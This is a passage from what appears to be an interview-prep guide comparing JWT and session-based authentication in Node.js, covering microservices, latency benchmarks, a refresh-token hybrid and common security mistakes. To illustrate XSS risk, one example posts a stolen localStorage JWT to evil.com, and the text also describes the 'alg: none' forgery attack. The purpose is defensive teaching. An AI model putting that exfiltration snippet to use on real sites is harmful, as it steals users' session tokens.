```

**5. Microservices Architecture:**

**Session (Requires Shared Session Store):**

```javascript
// ❌ All services need access to same Redis
// Service A
app.get('/api/orders', requireSession, (req, res) => {
  // Needs Redis connection to validate session
});

// Service B
app.get('/api/payments', requireSession, (req, res) => {
  // Also needs Redis connection
});

// Problem:
// - Tight coupling to Redis
// - Redis becomes single point of failure
// - Cross-service latency for session lookups
```

**JWT (Each Service Validates Independently):**

```javascript
// ✅ Each service validates JWT independently
// Service A
app.get('/api/orders', authenticateJWT, (req, res) => {
  // Verifies JWT signature (no external service needed)
  const decoded = jwt.verify(token, JWT_SECRET);
});

// Service B
app.get('/api/payments', authenticateJWT, (req, res) => {
  // Also verifies independently
  const decoded = jwt.verify(token, JWT_SECRET);
});

// Pros:
// - No shared state
// - Services are independent
// - No cross-service calls for auth
```

**6. Performance Benchmarks:**

**Session Validation (with Redis):**

```javascript
// Session lookup: ~2-5ms
const start = Date.now();
const session = await redisClient.get(`sess:${sessionId}`);
const sessionData = JSON.parse(session);
const end = Date.now();
console.log(`Session lookup: ${end - start}ms`); // ~2-5ms

// Network roundtrip to Redis
// Adds latency to every request
```

**JWT Validation (Cryptographic):**

```javascript
// JWT verification: ~0.1-0.5ms
const start = Date.now();
const decoded = jwt.verify(token, JWT_SECRET);
const end = Date.now();
console.log(`JWT verify: ${end - start}ms`); // ~0.1-0.5ms

// Pure CPU operation (HMAC-SHA256)
// No network calls needed
```

**Load Test Results (10,000 req/s):**

| **Metric** | **Session** | **JWT** |
|-----------|------------|---------|
| **Avg Latency** | 15ms | 10ms |
| **P99 Latency** | 45ms | 18ms |
| **Redis CPU** | 80% | 0% |
| **App CPU** | 25% | 30% |
| **Failed Requests** | 50/10000 (Redis timeout) | 0/10000 |

**7. Hybrid Approach (Best of Both Worlds):**

```javascript
// ✅ Recommended: JWT with refresh tokens in database
// - Access token (JWT): 15 min, stateless
// - Refresh token: 7 days, stored in DB

// Advantages:
// 1. Stateless most of the time (15 min window)
// 2. Can revoke refresh tokens (logout, security breach)
// 3. Only hit DB for refresh (every 15 min, not every request)
// 4. Balance security and scalability

app.post('/login', async (req, res) => {
  const accessToken = jwt.sign(payload, secret, { expiresIn: '15m' });
  const refreshToken = jwt.sign(payload, refreshSecret, { expiresIn: '7d' });

  // Store refresh token (can revoke)
  await RefreshToken.create({ token: refreshToken, userId: user.id });

  res.cookie('accessToken', accessToken, { httpOnly: true, maxAge: 15 * 60 * 1000 });
  res.cookie('refreshToken', refreshToken, { httpOnly: true, maxAge: 7 * 24 * 60 * 60 * 1000 });
});

// Most requests: verify JWT (stateless, fast)
app.get('/api/data', authenticateJWT, (req, res) => {
  // No DB lookup
});

// Every 15 min: refresh token (DB lookup)
app.post('/refresh', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  const decoded = jwt.verify(refreshToken, refreshSecret);

  // Check if refresh token still valid (not revoked)
  const storedToken = await RefreshToken.findOne({ token: refreshToken });
  if (!storedToken) {
    return res.status(403).json({ error: 'Token revoked' });
  }

  // Generate new access token
  const newAccessToken = jwt.sign(payload, secret, { expiresIn: '15m' });
  res.cookie('accessToken', newAccessToken, { httpOnly: true });
});
```

**When to Choose:**

| **Use Case** | **Recommended Approach** |
|-------------|------------------------|
| **Monolith app, single server** | Session-based |
| **Microservices** | JWT with refresh tokens |
| **Mobile app API** | JWT (header-based) |
| **Banking/high security** | Session-based (instant revocation) |
| **Serverless (Lambda)** | JWT (stateless) |
| **Small user base (<10K)** | Session-based (simpler) |
| **Large scale (>100K)** | JWT with refresh tokens |
| **Need instant logout** | Session-based |

</details>

<details>
<summary><strong>💬 Explain to Junior: JWT vs Session Authentication</strong></summary>

**Real-Life Analogy:**

Think of authentication as getting into a theme park.

**Session-Based = Stamped Hand:**
- You buy a ticket at the entrance (login)
- Staff stamps your hand with invisible ink (session ID)
- Every ride, staff scans your hand to verify the stamp (session lookup)
- If you leave and re-enter, they check their system: "Does this stamp match our records?"
- To kick you out, they simply remove you from the system (revoke session)

**JWT = All-Access Pass:**
- You buy a ticket at the entrance (login)
- You receive a laminated pass with your photo, name, and expiration date (JWT token)
- Every ride, staff just look at your pass – no need to check with the office (stateless)
- If your pass is stolen, it's still valid until expiration date (can't revoke)
- To kick you out, staff need to remember every kicked-out person (blacklist)

**Why This Matters:**

Imagine you're building an e-commerce site. You need to remember who's logged in:

**Session Approach:**
- User logs in → server creates session in database
- Server gives user a tiny cookie (session ID): "session_123"
- User requests profile → server looks up "session_123" in database → "Oh, that's Alice!"

**JWT Approach:**
- User logs in → server creates token with user info: "eyJhbGc...{userId:5,name:'Alice'}"
- User requests profile → server decodes token → "This says userId:5, name:Alice. Signature valid? Yes! Trust it."
- No database lookup needed!

**In Simple Terms:**

**Session** = "I'll remember you. Come back and tell me your ID."
**JWT** = "Here's everything you need. Carry it with you. I trust the signature."

**Common Scenarios:**

**Scenario 1: User Logs Out**

**Session (Easy):**
```javascript
// User clicks logout
// Server: "Delete their session from database"
await deleteSession(sessionId);
// Done! User can't access anything anymore.
```

**JWT (Hard):**
```javascript
// User clicks logout
// Problem: Token is still valid!
// Server can't "un-sign" the token
// Workarounds:
// 1. Wait for token to expire (15 min)
// 2. Maintain blacklist (defeats stateless purpose)
// 3. Use refresh tokens (hybrid approach)
```

**Scenario 2: Scaling to Multiple Servers**

**Session (Needs Coordination):**
```javascript
// User logs in on Server A
// Server A stores session in Redis

// User's next request goes to Server B (load balancer)
// Server B checks Redis: "Is this session valid?"
// Redis: "Yes, session_123 belongs to Alice"

// All servers must access same Redis
// If Redis goes down, all sessions lost!
```

**JWT (No Coordination):**
```javascript
// User logs in on Server A
// Server A signs JWT with secret key

// User's next request goes to Server B
// Server B verifies JWT signature with same secret key
// No need to check Redis or talk to Server A

// All servers can work independently!
```

**Scenario 3: Mobile App Authentication**

**Session (Tricky):**
```javascript
// Mobile apps don't handle cookies well
// You need to manually manage cookie jar
// Different behavior on iOS vs Android
// httpOnly cookies not accessible to app code
```

**JWT (Simple):**
```javascript
// Store token in secure storage
await SecureStore.setItemAsync('token', jwt);

// Send in Authorization header
fetch('/api/profile', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});

// Same API for web and mobile!
```

**Common Beginner Mistakes:**

**Mistake 1: Storing JWT in localStorage (XSS Vulnerable)**
```javascript
// ❌ BAD: Any JavaScript can access
localStorage.setItem('jwt', token);

// Attacker injects script:
fetch('https://evil.com', {
  method: 'POST',
  body: localStorage.getItem('jwt') // Stolen!
});

// ✅ GOOD: Use httpOnly cookie
res.cookie('jwt', token, {
  httpOnly: true, // JavaScript can't access
  secure: true,
  sameSite: 'strict'
});
```

**Mistake 2: Long JWT Expiration (Can't Revoke)**
```javascript
// ❌ BAD: 30-day expiration
const token = jwt.sign(payload, secret, {
  expiresIn: '30d' // If stolen, valid for 30 days!
});

// ✅ GOOD: Short access + refresh tokens
const accessToken = jwt.sign(payload, secret, { expiresIn: '15m' });
const refreshToken = jwt.sign(payload, secret, { expiresIn: '7d' });

// Store refresh token in DB (can revoke)
await saveRefreshToken(refreshToken, userId);
```

**Mistake 3: Not Validating JWT Algorithm**
```javascript
// ❌ BAD: Accepts any algorithm
const decoded = jwt.decode(token); // No verification!

// Attacker creates token with "alg": "none"
// Server accepts it without checking signature!

// ✅ GOOD: Verify with algorithm whitelist
const decoded = jwt.verify(token, secret, {
  algorithms: ['HS256'] // Only accept HS256
});
```

**Interview Answer Template:**

**Question: "When would you use JWT vs session-based authentication?"**

**2-Minute Answer:**

"The choice between JWT and session-based auth depends on your architecture and requirements.

**Session-based authentication** stores user state on the server (usually in Redis). The client receives a small session ID in an httpOnly cookie. On each request, the server looks up the session to validate the user.

**Advantages:**
- Instant revocation (just delete the session)
- Smaller cookie size (32 bytes vs 1-2 KB)
- Better for single-server or monolithic apps

**Disadvantages:**
- Requires centralized session store
- Horizontal scaling needs Redis cluster
- Additional latency for session lookup

**JWT authentication** stores user data in a signed token that the client holds. The server verifies the signature on each request but doesn't store session state.

**Advantages:**
- Stateless (no database lookup)
- Perfect for microservices (each service validates independently)
- Easier horizontal scaling
- Better for mobile apps (no cookie handling)

**Disadvantages:**
- Difficult to revoke (token valid until expiration)
- Larger size (1-2 KB in headers)
- If stored in localStorage, vulnerable to XSS

**My recommendation:** Use a hybrid approach:
- Short-lived JWT access tokens (15 min) for stateless performance
- Refresh tokens stored in database (7 days) for revocation capability
- httpOnly cookies for web (XSS protection)
- Authorization headers for mobile

**Example:**
```javascript
// Access token: fast, stateless
const accessToken = jwt.sign(payload, secret, { expiresIn: '15m' });

// Refresh token: can revoke
const refreshToken = jwt.sign(payload, refreshSecret, { expiresIn: '7d' });
await RefreshToken.create({ token: refreshToken, userId });
```

This gives you the scalability benefits of JWT with the security benefits of session-based auth."

**Follow-Up Concepts:**

**Q: "How do you handle JWT token theft?"**

A: "JWT token theft is serious because you can't immediately revoke tokens. Here's my strategy:

1. **Prevention:**
   - Store tokens in httpOnly cookies (not localStorage)
   - Short expiration (15 minutes for access tokens)
   - Use refresh tokens stored in database

2. **Detection:**
   - Monitor for anomalous access patterns (new IP, location, device)
   - Implement rate limiting per token
   - Log all authentication events

3. **Response:**
   - Revoke refresh tokens immediately (forces re-login)
   - Accept that access token may be valid for up to 15 minutes
   - Require step-up authentication for sensitive actions
   - Implement token rotation (each refresh issues new tokens)

4. **Example:**
```javascript
// Detect suspicious activity
if (requestIP !== user.lastKnownIP) {
  // Require MFA for sensitive operations
  if (isSensitiveOperation(request)) {
    return res.status(403).json({ error: 'MFA required' });
  }
}

// Revoke all refresh tokens
await RefreshToken.deleteMany({ userId });
```

The key is layering multiple protections since JWT revocation is challenging."

**Q: "Can you explain how JWT signatures work?"**

A: "JWT signatures ensure the token hasn't been tampered with. It's like a wax seal on a letter.

**How it works:**

1. **Signing (Server):**
```javascript
// 1. Create header and payload
const header = { alg: 'HS256', typ: 'JWT' };
const payload = { userId: 123, exp: 1234567890 };

// 2. Encode as Base64
const encodedHeader = base64(header);
const encodedPayload = base64(payload);

// 3. Create signature
const signature = HMAC_SHA256(
  encodedHeader + '.' + encodedPayload,
  SECRET_KEY
);

// 4. Combine
const jwt = encodedHeader + '.' + encodedPayload + '.' + signature;
```

2. **Verification (Server):**
```javascript
// 1. Split token
const [header, payload, signature] = jwt.split('.');

// 2. Recompute signature
const expectedSignature = HMAC_SHA256(
  header + '.' + payload,
  SECRET_KEY
);

// 3. Compare
if (signature === expectedSignature) {
  // Token is valid and unmodified
  return JSON.parse(base64Decode(payload));
} else {
  throw new Error('Invalid signature - token tampered!');
}
```

**Key point:** Without the secret key, an attacker can't create a valid signature. Even if they change the payload, the signature won't match.

**Analogy:** It's like a sealed envelope. If someone opens it and changes the letter, you'll know because the seal is broken."

**Visual Learning Aid:**

```
JWT Structure:
┌────────────────────────────────────────────┐
│ eyJhbGc...    .    eyJ1c2Vy...    .  SflKx  │
│   HEADER           PAYLOAD          SIGNATURE│
└────────────────────────────────────────────┘

Header:                 Payload:               Signature:
{                       {                      HMAC-SHA256(
  "alg": "HS256",        "userId": 123,         header + payload,
  "typ": "JWT"           "exp": 1234567890      secret
}                      }                      )

If attacker modifies payload:
✅ Can change payload
❌ Cannot create valid signature (no secret)
❓ Server recomputes signature → Doesn't match → REJECTED
```

**Session vs JWT Flow:**

```
SESSION-BASED:
┌──────┐  1. Login    ┌──────┐  2. Create Session  ┌───────┐
│Client│─────────────>│Server│────────────────────>│Redis  │
└──────┘              └──────┘                     └───────┘
   │    <──────────────────┘
   │      3. Set Cookie (session_123)
   │
   │  4. Request + Cookie
   │──────────────────>┌──────┐  5. Lookup Session  ┌───────┐
   │                   │Server│────────────────────>│Redis  │
   │                   └──────┘<────────────────────└───────┘
   │<──────────────────────┘      6. Return data
   │      7. Response

JWT-BASED:
┌──────┐  1. Login    ┌──────┐
│Client│─────────────>│Server│
└──────┘              └──────┘
   │    <──────────────────┘
   │      2. Return JWT (no DB storage)
   │
   │  3. Request + JWT
   │──────────────────>┌──────┐
   │                   │Server│ (4. Verify signature - no DB)
   │                   └──────┘
   │<──────────────────────┘
   │      5. Response (faster, no DB lookup)
```

**Key Takeaways:**

1. **Session** = Server remembers you (stateful)
2. **JWT** = You carry your credentials (stateless)
3. **Session** = Easy revocation, harder scaling
4. **JWT** = Easy scaling, harder revocation
5. **Best practice** = Hybrid (short JWT + refresh tokens)

</details>

### Common Mistakes

❌ **Wrong**: Storing JWT in localStorage
```javascript
// Vulnerable to XSS attacks
localStorage.setItem('jwt_token', token);
```

✅ **Correct**: Store JWT in httpOnly cookie
```javascript
res.cookie('accessToken', token, {
  httpOnly: true,  // XSS protection
  secure: true,
  sameSite: 'strict'
});
```

---

❌ **Wrong**: Long JWT expiration without revocation mechanism
```javascript
// If stolen, valid for 30 days!
const token = jwt.sign(payload, secret, { expiresIn: '30d' });
```

✅ **Correct**: Short access token + refresh token in database
```javascript
const accessToken = jwt.sign(payload, secret, { expiresIn: '15m' });
const refreshToken = jwt.sign(payload, refreshSecret, { expiresIn: '7d' });

// Store refresh token (can revoke)
await RefreshToken.create({ token: refreshToken, userId });
```

---

❌ **Wrong**: Not validating JWT algorithm
```javascript
// Vulnerable to "alg: none" attack
const decoded = jwt.decode(token);
```

✅ **Correct**: Always verify with algorithm whitelist
```javascript
const decoded = jwt.verify(token, secret, {
  algorithms: ['HS256'] // Whitelist algorithm
});
```

### Follow-up Questions

1. "How do you implement JWT refresh token rotation?"
2. "What are the security implications of using RS256 vs HS256 for JWT?"
3. "How would you migrate from session-based to JWT authentication?"
4. "Can you explain the 'none' algorithm attack on JWT?"
5. "How do you handle JWT authentication in a microservices architecture?"

### Resources

- [JWT.io: Introduction to JSON Web Tokens](https://jwt.io/introduction)
- [OWASP: JSON Web Token Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [RFC 7519: JWT Specification](https://datatracker.ietf.org/doc/html/rfc7519)
- [Auth0: JWT Security Best Practices](https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/)

---
